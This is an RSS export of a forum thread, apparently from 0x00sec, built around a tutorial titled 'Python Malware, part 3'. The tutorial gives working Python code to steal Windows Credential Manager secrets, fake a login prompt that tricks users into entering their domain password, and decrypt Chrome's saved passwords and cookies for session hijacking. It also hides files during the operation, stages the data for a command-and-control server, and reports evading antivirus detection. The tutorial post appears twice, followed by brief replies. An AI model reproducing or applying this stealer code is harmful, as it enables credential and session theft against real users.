<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Malware writing - Python Malware, part 3: Stealing credentials and cookies</title>
    <link>https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099</link>
    <description>Keylogging and clipboard monitoring are very useful and probably all we need to capture credentials easily. That said, there might be already saved credentials on the system that we also want to recover. In part 3, we&#39;ll cover some useful and basic techniques to steal credentials and cookies with standard user privileges. This time instead of writing something painfully long and complex with `ctypes`, we&#39;ll use `pywin32` which is a wrapper for the WinAPI. To install it, simply use the `pip install pypiwin32` command.

We start by importing the packages and modules we&#39;ll need and create a constant to be used when calling some Credential Manager (also known as CredMan) related functions.

```
import os
import io
import sys
import sqlite3
import json
import shutil
import win32cred
import win32crypt
import win32api
import win32con
import pywintypes

CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC
```

Then, we&#39;ll create a new class called `credentials`. It won&#39;t need any constructor, it&#39;s simply to differentiate the credentials methods from the cookies methods. Within that class, we&#39;ll start with the `dump_credsman_generic()` method. 

&lt;h2&gt;Dumping generic credentials from Windows Credential Manager&lt;/h2&gt;

That function is meant to dump all generic credentials stored in the Credential Manager. Generic credentials are non-domain type credentials. For example, if you use Git on Windows and you authenticate to GitHub, Bitbucket, Gitlab, etc. the credentials are stored in CredMan. We cannot read domain credentials (`CRED_TYPE_DOMAIN`) without interacting with LSASS which we want to avoid (source: https://docs.microsoft.com/en-us/windows/desktop/secauthn/kinds-of-credentials).

We start by importing the functions we&#39;ll need to enumerate and read the credentials.

```
    def dump_credsman_generic():
        
        CredEnumerate = win32cred.CredEnumerate
        CredRead = win32cred.CredRead
```

Then, we enumerate the credentials stored in credman and put them in the `creds` variable, which is a tuple.

```
        try:
            creds = CredEnumerate(None, 0)  # Enumerate credentials
        except Exception:              		# Avoid crashing on any exception
            pass
```

Now we want to iterate through each credential set (named package here because _set_ is a Python keyword) and add them as individual elements to the `credentials` list so it&#39;s easier to work with.

```
        credentials = []

        for package in creds:
            try:
                target = package[&#39;TargetName&#39;]
                creds = CredRead(target, CRED_TYPE_GENERIC)
                credentials.append(creds)
            except pywintypes.error:
                pass
```

You might notice two things here. First we&#39;re using a list instead of a dictionary. That&#39;s because the credential blob is in hexadecimal. In Python, octal and hexadecimal formats are not supported by JSON so we use a list as workaround.

The second thing is that we use `CredRead()`, which returns the same data as CredEnumerate(). The difference here is that CredRead() is used to read a specific package (or set) of credentials while CredEnumerate() just returns everything. We could simply loop through the `creds` variable, but from what I&#39;ve seen reading some C code using CredMan, `CredRead()` is the clean way to do it (don&#39;t hesitate to correct me if I&#39;m wrong).

Now it&#39;s time to create an in-memory text stream (to avoid writing a file on disk) that we can later send to our not-yet-built C2.

```
        credman_creds = io.StringIO() # In-memory text stream

        for cred in credentials:

            service = cred[&#39;TargetName&#39;]
            username = cred[&#39;UserName&#39;]
            password = cred[&#39;CredentialBlob&#39;].decode()

            credman_creds.write(&#39;Service: &#39; + str(service) + &#39;\n&#39;)
            credman_creds.write(&#39;Username: &#39; + str(username) + &#39;\n&#39;)
            credman_creds.write(&#39;Password: &#39; + str(password) + &#39;\n&#39;)
            credman_creds.write(&#39;\n&#39;)

        return credman_creds.getvalue()
```
We first start with creating the `credman_creds` text stream that will hold the service, username and password. We then iterate through the `credentials` variable and write the data we want to the text stream, making sure we decode the credential blob so we get the password in plain-text. When done, we simply return the data contained in the text stream.

We can test by editing our `main.py` file with the following:

```
import stealer

if __name__ == &#39;__main__&#39;:
    
    credstealer = stealer.credentials
    print(credstealer.dump_credsman_generic())
```

The result:    

![10103|690x247](upload://qldOM49djnUBTp8zhYmEbU7OwNa.png) 


As you can see above, if there are git keys or passwords stored in there, you can dump them which could give you access to source code that isn&#39;t public.The `Microsoft_OC1` TargetName is actually the password for a Skype for Business account, which is the same as the domain password of the user. If the user is also running Outlook 2016, you&#39;ll likely find his domain credentials under `MicrosoftOffice16_Data:SSPI:&lt;account&gt;`.

![14158|515x58](upload://oG2KkspudeuJ0qROZuKVbHpBEuQ.png) 


&lt;h2&gt;Asking for domain credentials with a prompt&lt;/h2&gt;

As said previously, it&#39;s common nowadays for penetration testers to use Mimikatz to dump credentials from LSASS. The problem is that it gets caught immediately by most EDR and next-gen AVs. If you haven&#39;t been lucky with the keylogging and the credential manager to find the user&#39;s domain password, about just asking for it?

We can try to do some social engineering and trick the user to give us his domain credentials using the `CredUIPromptForCredentials()` function to display a dialog box asking for them. The function does exactly that and returns the password entered as plain text.

```
        CredUIPromptForCredentials = win32cred.CredUIPromptForCredentials

        creds = []

        try:
            creds = CredUIPromptForCredentials(os.environ[&#39;userdomain&#39;], 0, os.environ[&#39;username&#39;], None, True, CRED_TYPE_GENERIC, {})
        except Exception:   # Avoid crashing on any exception
            pass
        return creds
```
Here we use the environment variable `userdomain` to display the target. If the user is on the domain `CONTOSO.LOCAL`, the prompt will ask to enter credentials for the user on domain `CONTOSO-LOCAL`, which is the name returned by `userdomain`.

![23629|319x285](upload://7NA97343r0Bx016sT4olSS33gp8.png) 

As you can see below, the method returns the credentials entered in plain text.

![20184|347x21](upload://a0sBnf8qrOZOTr0tD0VAysVIepQ.png) 

&lt;h2&gt;Dumping passwords saved in Chrome&lt;/h2&gt;

Chrome is the browser with the most marketshare so it will naturally be a prime target. Every single piece of stealer malware I&#39;ve seen steals passwords from Chrome because, to be honest, it&#39;s really easy. If you don&#39;t set a master password when saving your credentials, the encrypted blob in the Login Data database can be decrypted with the `CryptUnprotectData` as long as its done in the current user context. This means that you can&#39;t just grab the database and open it on a different machine with a different user.

Chrome passwords are stored in a SQLite database called `Login Data` located in the `%localappdata%\Google\Chrome\User Data\Default\` directory. The structure of the database can be seen here using DB Browser, an open source database tool for SQLite.

![21969|690x399](upload://up2YMwXLPtyRUlROOA7npWL2u0q.png) 

There are three relevant fields here that we&#39;ll want to query for: `action_urls`, `username_value` and `password_value`. The field `password_value` contains an encrypted blob that we will decrypt with the code below. 

First, we want to make a local copy of the database file, otherwise, if Chrome is currently running, it will have a handle on it and the database will be locked. Alternatively, we could use WMI to query the running processes and wait for Chrome
to stop running but that could take a long time.

```
        try:
            login_data = os.environ[&#39;localappdata&#39;] + &#39;\\Google\\Chrome\\User Data\\Default\\Login Data&#39;
            shutil.copy2(login_data, &#39;./Login Data&#39;) # Copy DB to current dir
            win32api.SetFileAttributes(&#39;./Login Data&#39;, win32con.FILE_ATTRIBUTE_HIDDEN) # Make file invisible during operation
        except Exception:
            pass

	chrome_credentials = io.StringIO() # In-memory text stream
```

We use basic exception handling to avoid crashing the program if one occurs. If you need to troubleshoot issues with `sqlite3`, use `sqlite3.Error` to get the details. Then we create a in-memory text stream that will contain the dumped credentials to avoid writing a file on disk.

Now, we have to open the local copy of the `Login Data` database with the sqlite3 library and query for the credentials that were saved by the user.

```
        try:
            conn = sqlite3.connect(&#39;./Login Data&#39;, )                                        # Connect to database
            cursor = conn.cursor()                                                          # Create a cursor to fetch the data
            cursor.execute(&#39;SELECT action_url, username_value, password_value FROM logins&#39;) # Run the query
            results = cursor.fetchall()                                                     # Get the results
            conn.close()                                                                    # Close the database file so it&#39;s not locked by the process
            os.remove(&#39;Login Data&#39;)                                                         # Delete file when done as the results are in a variable.
```
This is an easy and simple example on how to query a SQLite database with Python but it can be very useful. Later, when dealing with Chrome cookies, we&#39;ll also update the data in the database. Now that our variable  `results` contains the results of the query, which are the urls, usernames and encrypted passwords, we can loop through those results and decrypt the passwords with the WinAPI function `CryptUnprotectData` and append them to our in-memory text stream.

```

            for action_url, username_value, password_value in results:        							                                 
                password = win32crypt.CryptUnprotectData(password_value, None, None, None, 0)[1] # Decrypt the password with CryptUnprotectData
                if password:                                                                		 # Write credentials to text stream in memory
                    chrome_credentials.write(&#39;URL: &#39; + action_url + &#39;\n&#39;)
                    chrome_credentials.write(&#39;Username: &#39; + username_value + &#39;\n&#39;)
                    chrome_credentials.write(&#39;Password: &#39; + str(password) + &#39;\n&#39;)
                    chrome_credentials.write(&#39;\n&#39;)
            return chrome_credentials.getvalue()                                            		 # Return content of the text stream

        except sqlite3.OperationalError as e: # Simple exception handling to avoid crashing
            print(e)                          # when opening the Login Data database
            pass

        except Exception as e:                # Avoid crashing for any other exception
            print(e)
            pass
```
We use `CryptUnprotectData` to decrypt the blob because Chrome on Windows uses the `CryptProtectData` WinAPI function to encrypt them (reference: https://chromium.googlesource.com/chromium/chromium/+/master/chrome/browser/password_manager/encryptor_win.cc). As you can read on MSDN regarding `CryptProtectData`, *The CryptProtectData function performs encryption on the data in a DATA_BLOB structure. Typically, only a user with the same logon credential as the user who encrypted the data can decrypt the data. In addition, the encryption and decryption usually must be done on the same computer. For information about exceptions, see Remarks.* This is why we need to decrypt the data locally and in the same user context.

Now, we can test the method by modifying our `main.py` to call it.

```
import stealer

if __name__ == &#39;__main__&#39;:

    credstealer = stealer.credentials
    print(credstealer.dump_chrome_passwords())
```

Then we run `main.py` and...

![8401|435x215](upload://yr1atdkuc3TsALbNmVjOISR8JjL.png) 

&lt;h2&gt;Stealing Chrome cookies&lt;/h2&gt;    

Chrome cookies are managed the same way as passwords. They are stored in a database file called `Cookies` and are encrypted with `CryptProtectData`. So the decryption will be done the same way. However, there are two differences here. First, we rewrite the data inside the database with the decrypted cookies instead of writing them in a file. Second, this we steal the whole database file with the decrypted cookies. This database can then be uploaded to a remote server and used for authenticating in the sites visited by the user if the session has not expired on the server side or if the user has not signed-out.

```
        login_data = os.environ[&#39;localappdata&#39;] + &#39;\\Google\\Chrome\\User Data\\Default\\Cookies&#39; # Path to Cookies database file
        shutil.copy2(login_data, &#39;./Cookies&#39;)                                                     # Copy DB to current dir
        win32api.SetFileAttributes(&#39;./Cookies&#39;, win32con.FILE_ATTRIBUTE_HIDDEN)                   # Make file invisible during operation

        try:
            conn = sqlite3.connect(&#39;./Cookies&#39;)                                                   # Connect to database
            cursor = conn.cursor()
            cursor.execute(&#39;SELECT host_key, name, value, encrypted_value FROM cookies&#39;)          # Run the query
            results = cursor.fetchall()                                                           # Get the results

            # Decrypt the cookie blobs
            for host_key, name, value, encrypted_value in results:
                decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
            
                # Updating the database with decrypted values.             
                cursor.execute(&quot;UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999,\
                                is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?&quot;,(decrypted_value, host_key, name));

            conn.commit()   # Save the changes
            conn.close()    # Close the database file so it&#39;s not locked by the process

        except Exception as e:  # Avoid crashes from exceptions if any occurs.
            print(e)
            pass

    # Then, after this function is called, we would exfiltrate the database and delete it.
```

Don&#39;t forget that using cookies by themselves however does not always work. Sessions might be tied to additional information such as user-agent, IP address, referrer, etc. so we have to gather as much information as we can on the user and the host first. This will be covered in part 4 where we&#39;ll build a simple module to collect system information and set up a command and control server using GitHub so we can hide the traffic in plain sight.

Now let&#39;s see if building an executable that dumps credman and Chrome passwords triggers detections...

![24086|690x155](upload://ouMjbHdEIWlcuJvODce32A6vkDC.png) 

https://www.virustotal.com/#/file/e52b5a3cd7df00b050287148412c44526b349a4beafe797fabdd57967a405d81/detection

Nope. But to be fair, it doesn&#39;t do much right now. That said, credential dumping in user space with standard privilege rarely gets detected. That&#39;s because, even for heuristics, it&#39;s hard to determine if access to credential manager or not is for malicious purpose as many legitimate applications use it to &quot;securely&quot; store credentials. If you don&#39;t try to escalate privileges and dump LSASS, it&#39;s unlikely that you&#39;ll be detected.

The full code with useful comments can be found here:
https://github.com/tr4cefl0w/0x00sec/tree/master/python-malware</description>
    
    <lastBuildDate>Tue, 02 Apr 2019 19:03:35 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Malware writing - Python Malware, part 3: Stealing credentials and cookies</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099/12</link>
        <pubDate>Sun, 07 Apr 2019 01:53:55 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-12099-12</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099.rss">Malware writing - Python Malware, part 3: Stealing credentials and cookies</source>
      </item>
      <item>
        <title>Malware writing - Python Malware, part 3: Stealing credentials and cookies</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>Have you ever heard of Google? Or thought of clicking on my profile? <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099/11</link>
        <pubDate>Tue, 02 Apr 2019 19:03:35 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-12099-11</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099.rss">Malware writing - Python Malware, part 3: Stealing credentials and cookies</source>
      </item>
      <item>
        <title>Malware writing - Python Malware, part 3: Stealing credentials and cookies</title>
        <dc:creator><![CDATA[xmrchaos]]></dc:creator>
        <description><![CDATA[
            <p>where is the first and second topic?</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099/10</link>
        <pubDate>Mon, 01 Apr 2019 22:18:29 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-12099-10</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099.rss">Malware writing - Python Malware, part 3: Stealing credentials and cookies</source>
      </item>
      <item>
        <title>Malware writing - Python Malware, part 3: Stealing credentials and cookies</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>Feel free to message me directly if you ever have any questions.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099/7</link>
        <pubDate>Sun, 10 Mar 2019 00:49:00 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-12099-7</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099.rss">Malware writing - Python Malware, part 3: Stealing credentials and cookies</source>
      </item>
      <item>
        <title>Malware writing - Python Malware, part 3: Stealing credentials and cookies</title>
        <dc:creator><![CDATA[xXxH4CK0RxXx]]></dc:creator>
        <description><![CDATA[
            <p>well, i’m a beginner. so thanks again</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099/6</link>
        <pubDate>Sat, 09 Mar 2019 23:49:17 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-12099-6</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099.rss">Malware writing - Python Malware, part 3: Stealing credentials and cookies</source>
      </item>
      <item>
        <title>Malware writing - Python Malware, part 3: Stealing credentials and cookies</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>Thanks! I’m trying to make them easy to understand for beginners. They could be even more in depth and painfully long if we were doing everything with ctypes <img src="https://0x00sec.org/images/emoji/twitter/joy.png?v=9" title=":joy:" class="emoji" alt=":joy:"></p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099/5</link>
        <pubDate>Sat, 09 Mar 2019 22:09:41 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-12099-5</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099.rss">Malware writing - Python Malware, part 3: Stealing credentials and cookies</source>
      </item>
      <item>
        <title>Malware writing - Python Malware, part 3: Stealing credentials and cookies</title>
        <dc:creator><![CDATA[xXxH4CK0RxXx]]></dc:creator>
        <description><![CDATA[
            <p>thanks a lot <a class="mention" href="https://0x00sec.org/u/tr4cefl0w">@tr4cefl0w</a> these are really great in depth tutorials you’re making.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099/4</link>
        <pubDate>Sat, 09 Mar 2019 21:47:42 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-12099-4</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099.rss">Malware writing - Python Malware, part 3: Stealing credentials and cookies</source>
      </item>
      <item>
        <title>Malware writing - Python Malware, part 3: Stealing credentials and cookies</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>I don’t have that error. What version of Python are you using? Are you running it with PyInstaller? If so, show the full debug output. My guess is that you need an hidden import which you have to compile it with, probably win32timezone.</p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099/3</link>
        <pubDate>Sat, 09 Mar 2019 18:42:33 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-12099-3</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099.rss">Malware writing - Python Malware, part 3: Stealing credentials and cookies</source>
      </item>
      <item>
        <title>Malware writing - Python Malware, part 3: Stealing credentials and cookies</title>
        <dc:creator><![CDATA[check-sec]]></dc:creator>
        <description><![CDATA[
            <p>Errors out saying: local variable  creds is referenced before assignment !<br>
My code is exact as in the article;<br>
This is pertaining to the generic dumping oly…Not the latter half of the article <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099/2</link>
        <pubDate>Sat, 09 Mar 2019 10:48:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-12099-2</guid>
        <source url="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099.rss">Malware writing - Python Malware, part 3: Stealing credentials and cookies</source>
      </item>
      <item>
        <title>Malware writing - Python Malware, part 3: Stealing credentials and cookies</title>
        <dc:creator><![CDATA[tr4cefl0w]]></dc:creator>
        <description><![CDATA[
            <p>Keylogging and clipboard monitoring are very useful and probably all we need to capture credentials easily. That said, there might be already saved credentials on the system that we also want to recover. In part 3, we’ll cover some useful and basic techniques to steal credentials and cookies with standard user privileges. This time instead of writing something painfully long and complex with <code>ctypes</code>, we’ll use <code>pywin32</code> which is a wrapper for the WinAPI. To install it, simply use the <code>pip install pypiwin32</code> command.</p>
<p>We start by importing the packages and modules we’ll need and create a constant to be used when calling some Credential Manager (also known as CredMan) related functions.</p>
<pre><code class="lang-auto">import os
import io
import sys
import sqlite3
import json
import shutil
import win32cred
import win32crypt
import win32api
import win32con
import pywintypes

CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC
</code></pre>
<p>Then, we’ll create a new class called <code>credentials</code>. It won’t need any constructor, it’s simply to differentiate the credentials methods from the cookies methods. Within that class, we’ll start with the <code>dump_credsman_generic()</code> method.</p>
<h2>Dumping generic credentials from Windows Credential Manager</h2>
<p>That function is meant to dump all generic credentials stored in the Credential Manager. Generic credentials are non-domain type credentials. For example, if you use Git on Windows and you authenticate to GitHub, Bitbucket, Gitlab, etc. the credentials are stored in CredMan. We cannot read domain credentials (<code>CRED_TYPE_DOMAIN</code>) without interacting with LSASS which we want to avoid (source: <a href="https://docs.microsoft.com/en-us/windows/desktop/secauthn/kinds-of-credentials" rel="noopener nofollow ugc">https://docs.microsoft.com/en-us/windows/desktop/secauthn/kinds-of-credentials</a>).</p>
<p>We start by importing the functions we’ll need to enumerate and read the credentials.</p>
<pre><code class="lang-auto">    def dump_credsman_generic():
        
        CredEnumerate = win32cred.CredEnumerate
        CredRead = win32cred.CredRead
</code></pre>
<p>Then, we enumerate the credentials stored in credman and put them in the <code>creds</code> variable, which is a tuple.</p>
<pre><code class="lang-auto">        try:
            creds = CredEnumerate(None, 0)  # Enumerate credentials
        except Exception:              		# Avoid crashing on any exception
            pass
</code></pre>
<p>Now we want to iterate through each credential set (named package here because <em>set</em> is a Python keyword) and add them as individual elements to the <code>credentials</code> list so it’s easier to work with.</p>
<pre><code class="lang-auto">        credentials = []

        for package in creds:
            try:
                target = package['TargetName']
                creds = CredRead(target, CRED_TYPE_GENERIC)
                credentials.append(creds)
            except pywintypes.error:
                pass
</code></pre>
<p>You might notice two things here. First we’re using a list instead of a dictionary. That’s because the credential blob is in hexadecimal. In Python, octal and hexadecimal formats are not supported by JSON so we use a list as workaround.</p>
<p>The second thing is that we use <code>CredRead()</code>, which returns the same data as CredEnumerate(). The difference here is that CredRead() is used to read a specific package (or set) of credentials while CredEnumerate() just returns everything. We could simply loop through the <code>creds</code> variable, but from what I’ve seen reading some C code using CredMan, <code>CredRead()</code> is the clean way to do it (don’t hesitate to correct me if I’m wrong).</p>
<p>Now it’s time to create an in-memory text stream (to avoid writing a file on disk) that we can later send to our not-yet-built C2.</p>
<pre><code class="lang-auto">        credman_creds = io.StringIO() # In-memory text stream

        for cred in credentials:

            service = cred['TargetName']
            username = cred['UserName']
            password = cred['CredentialBlob'].decode()

            credman_creds.write('Service: ' + str(service) + '\n')
            credman_creds.write('Username: ' + str(username) + '\n')
            credman_creds.write('Password: ' + str(password) + '\n')
            credman_creds.write('\n')

        return credman_creds.getvalue()
</code></pre>
<p>We first start with creating the <code>credman_creds</code> text stream that will hold the service, username and password. We then iterate through the <code>credentials</code> variable and write the data we want to the text stream, making sure we decode the credential blob so we get the password in plain-text. When done, we simply return the data contained in the text stream.</p>
<p>We can test by editing our <code>main.py</code> file with the following:</p>
<pre><code class="lang-auto">import stealer

if __name__ == '__main__':
    
    credstealer = stealer.credentials
    print(credstealer.dump_credsman_generic())
</code></pre>
<p>The result:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b89ead5ed2c16c042071f904abf43ab48f092b08.png" alt="10103" data-base62-sha1="qldOM49djnUBTp8zhYmEbU7OwNa" width="690" height="247"></p>
<p>As you can see above, if there are git keys or passwords stored in there, you can dump them which could give you access to source code that isn’t public.The <code>Microsoft_OC1</code> TargetName is actually the password for a Skype for Business account, which is the same as the domain password of the user. If the user is also running Outlook 2016, you’ll likely find his domain credentials under <code>MicrosoftOffice16_Data:SSPI:&lt;account&gt;</code>.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/acf4dd9e71829ff1cd451c298a9e53b067352a60.png" alt="14158" data-base62-sha1="oG2KkspudeuJ0qROZuKVbHpBEuQ" width="515" height="58"></p>
<h2>Asking for domain credentials with a prompt</h2>
<p>As said previously, it’s common nowadays for penetration testers to use Mimikatz to dump credentials from LSASS. The problem is that it gets caught immediately by most EDR and next-gen AVs. If you haven’t been lucky with the keylogging and the credential manager to find the user’s domain password, about just asking for it?</p>
<p>We can try to do some social engineering and trick the user to give us his domain credentials using the <code>CredUIPromptForCredentials()</code> function to display a dialog box asking for them. The function does exactly that and returns the password entered as plain text.</p>
<pre><code class="lang-auto">        CredUIPromptForCredentials = win32cred.CredUIPromptForCredentials

        creds = []

        try:
            creds = CredUIPromptForCredentials(os.environ['userdomain'], 0, os.environ['username'], None, True, CRED_TYPE_GENERIC, {})
        except Exception:   # Avoid crashing on any exception
            pass
        return creds
</code></pre>
<p>Here we use the environment variable <code>userdomain</code> to display the target. If the user is on the domain <code>CONTOSO.LOCAL</code>, the prompt will ask to enter credentials for the user on domain <code>CONTOSO-LOCAL</code>, which is the name returned by <code>userdomain</code>.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/36aa10c2b3040fafafbe0484a5fc362cc43c57ae.png" alt="23629" data-base62-sha1="7NA97343r0Bx016sT4olSS33gp8" width="319" height="285"></p>
<p>As you can see below, the method returns the credentials entered in plain text.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4623170787369b237a144427ac4347fe4c7f66aa.png" alt="20184" data-base62-sha1="a0sBnf8qrOZOTr0tD0VAysVIepQ" width="347" height="21"></p>
<h2>Dumping passwords saved in Chrome</h2>
<p>Chrome is the browser with the most marketshare so it will naturally be a prime target. Every single piece of stealer malware I’ve seen steals passwords from Chrome because, to be honest, it’s really easy. If you don’t set a master password when saving your credentials, the encrypted blob in the Login Data database can be decrypted with the <code>CryptUnprotectData</code> as long as its done in the current user context. This means that you can’t just grab the database and open it on a different machine with a different user.</p>
<p>Chrome passwords are stored in a SQLite database called <code>Login Data</code> located in the <code>%localappdata%\Google\Chrome\User Data\Default\</code> directory. The structure of the database can be seen here using DB Browser, an open source database tool for SQLite.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d51611405db5ef7832d1bd382b4e8954fe0815f2.png" alt="21969" data-base62-sha1="up2YMwXLPtyRUlROOA7npWL2u0q" width="690" height="399"></p>
<p>There are three relevant fields here that we’ll want to query for: <code>action_urls</code>, <code>username_value</code> and <code>password_value</code>. The field <code>password_value</code> contains an encrypted blob that we will decrypt with the code below.</p>
<p>First, we want to make a local copy of the database file, otherwise, if Chrome is currently running, it will have a handle on it and the database will be locked. Alternatively, we could use WMI to query the running processes and wait for Chrome<br>
to stop running but that could take a long time.</p>
<pre><code class="lang-auto">        try:
            login_data = os.environ['localappdata'] + '\\Google\\Chrome\\User Data\\Default\\Login Data'
            shutil.copy2(login_data, './Login Data') # Copy DB to current dir
            win32api.SetFileAttributes('./Login Data', win32con.FILE_ATTRIBUTE_HIDDEN) # Make file invisible during operation
        except Exception:
            pass

	chrome_credentials = io.StringIO() # In-memory text stream
</code></pre>
<p>We use basic exception handling to avoid crashing the program if one occurs. If you need to troubleshoot issues with <code>sqlite3</code>, use <code>sqlite3.Error</code> to get the details. Then we create a in-memory text stream that will contain the dumped credentials to avoid writing a file on disk.</p>
<p>Now, we have to open the local copy of the <code>Login Data</code> database with the sqlite3 library and query for the credentials that were saved by the user.</p>
<pre><code class="lang-auto">        try:
            conn = sqlite3.connect('./Login Data', )                                        # Connect to database
            cursor = conn.cursor()                                                          # Create a cursor to fetch the data
            cursor.execute('SELECT action_url, username_value, password_value FROM logins') # Run the query
            results = cursor.fetchall()                                                     # Get the results
            conn.close()                                                                    # Close the database file so it's not locked by the process
            os.remove('Login Data')                                                         # Delete file when done as the results are in a variable.
</code></pre>
<p>This is an easy and simple example on how to query a SQLite database with Python but it can be very useful. Later, when dealing with Chrome cookies, we’ll also update the data in the database. Now that our variable  <code>results</code> contains the results of the query, which are the urls, usernames and encrypted passwords, we can loop through those results and decrypt the passwords with the WinAPI function <code>CryptUnprotectData</code> and append them to our in-memory text stream.</p>
<pre><code class="lang-auto">
            for action_url, username_value, password_value in results:        							                                 
                password = win32crypt.CryptUnprotectData(password_value, None, None, None, 0)[1] # Decrypt the password with CryptUnprotectData
                if password:                                                                		 # Write credentials to text stream in memory
                    chrome_credentials.write('URL: ' + action_url + '\n')
                    chrome_credentials.write('Username: ' + username_value + '\n')
                    chrome_credentials.write('Password: ' + str(password) + '\n')
                    chrome_credentials.write('\n')
            return chrome_credentials.getvalue()                                            		 # Return content of the text stream

        except sqlite3.OperationalError as e: # Simple exception handling to avoid crashing
            print(e)                          # when opening the Login Data database
            pass

        except Exception as e:                # Avoid crashing for any other exception
            print(e)
            pass
</code></pre>
<p>We use <code>CryptUnprotectData</code> to decrypt the blob because Chrome on Windows uses the <code>CryptProtectData</code> WinAPI function to encrypt them (reference: <a href="https://chromium.googlesource.com/chromium/chromium/+/master/chrome/browser/password_manager/encryptor_win.cc" rel="noopener nofollow ugc">https://chromium.googlesource.com/chromium/chromium/+/master/chrome/browser/password_manager/encryptor_win.cc</a>). As you can read on MSDN regarding <code>CryptProtectData</code>, <em>The CryptProtectData function performs encryption on the data in a DATA_BLOB structure. Typically, only a user with the same logon credential as the user who encrypted the data can decrypt the data. In addition, the encryption and decryption usually must be done on the same computer. For information about exceptions, see Remarks.</em> This is why we need to decrypt the data locally and in the same user context.</p>
<p>Now, we can test the method by modifying our <code>main.py</code> to call it.</p>
<pre><code class="lang-auto">import stealer

if __name__ == '__main__':

    credstealer = stealer.credentials
